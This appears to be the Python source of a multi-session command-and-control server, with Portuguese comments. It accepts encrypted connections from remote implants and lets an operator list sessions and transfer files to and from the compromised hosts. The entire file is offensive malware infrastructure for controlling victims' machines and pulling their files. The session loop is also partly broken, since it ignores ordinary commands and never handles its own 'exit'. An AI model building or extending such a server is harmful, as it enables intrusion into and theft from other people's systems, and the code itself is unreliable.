# c2_multi_cli.py
import socket
import threading
from cripto_utils import encrypt_data, decrypt_data, decrypt_bytes, encrypt_bytes
import cmd

sessions = {}
session_counter = 1
lock = threading.Lock()

class SessionHandler(threading.Thread):
    def __init__(self, conn, addr, session_id):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.session_id = session_id
        self.active = True
        sessions[session_id] = self

    def run(self):
        print(f"[+] Sessão {self.session_id} conectada de {self.addr}")
        while self.active:
            try:
                data = self.conn.recv(8192)
                if not data:
                    break
                decrypted = decrypt_data(data.decode())
                print(f"\n[RESPONSE {self.session_id}] {decrypted}\n", end='')
            except:
                break
        self.conn.close()
        with lock:
            del sessions[self.session_id]
        print(f"[-] Sessão {self.session_id} desconectada")

    def send_command(self, cmd):
        try:
            self.conn.send(encrypt_data(cmd).encode())
        except:
            print("[!] Falha ao enviar comando.")

class C2Shell(cmd.Cmd):
    prompt = "C2 > "

    def do_sessions(self, arg):
        """Lista sessões ativas"""
        for sid, handler in sessions.items():
            print(f"{sid}: {handler.addr}")

    def do_interact(self, session_id):
        """Seleciona uma sessão para interagir"""
        try:
            session_id = int(session_id.strip())
            if session_id in sessions:
                self.interact_session(sessions[session_id])
            else:
                print("[!] Sessão não encontrada.")
        except ValueError:
            print("[!] ID inválido.")

    def interact_session(self, handler):
        print(f"[*] Interagindo com sessão {handler.session_id}. Digite 'exit' para sair.")
        while True:
            cmd_input = input(f"Session {handler.session_id} > ")

            if cmd_input.startswith("download "):
                handler.send_command(cmd_input)
                data = handler.conn.recv(1000000)  # 1 MB máx (ajuste conforme necessário)
                try:
                    content = decrypt_bytes(data)
                    filename = cmd_input.split(" ", 1)[1].split("/")[-1]
                    with open(f"downloads/{filename}", "wb") as f:
                        f.write(content)
                    print(f"[+] Arquivo salvo em downloads/{filename}")
                except Exception as e:
                    print(f"[!] Erro ao salvar: {e}")
                continue

            elif cmd_input.startswith("upload "):
                try:
                    parts = cmd_input.split(" ", 2)
                    local_path = parts[1]
                    remote_path = parts[2]
                    with open(local_path, "rb") as f:
                        file_data = f.read()
                    encoded = encrypt_bytes(file_data).decode()
                    upload_command = f"upload {remote_path} {encoded}"
                    handler.send_command(upload_command)
                    response = handler.conn.recv(8192).decode()
                    print(decrypt_data(response))
                except Exception as e:
                    print(f"[!] Erro no upload: {e}")
                continue

    def do_exit(self, arg):
        """Sai do servidor"""
        print("Encerrando servidor...")
        return True

def server_listener(host='0.0.0.0', port=9999):
    global session_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[+] C2 escutando em {host}:{port}")

    while True:
        conn, addr = server.accept()
        with lock:
            sid = session_counter
            session_counter += 1
        handler = SessionHandler(conn, addr, sid)
        handler.start()

if __name__ == "__main__":
    threading.Thread(target=server_listener, daemon=True).start()
    C2Shell().cmdloop()
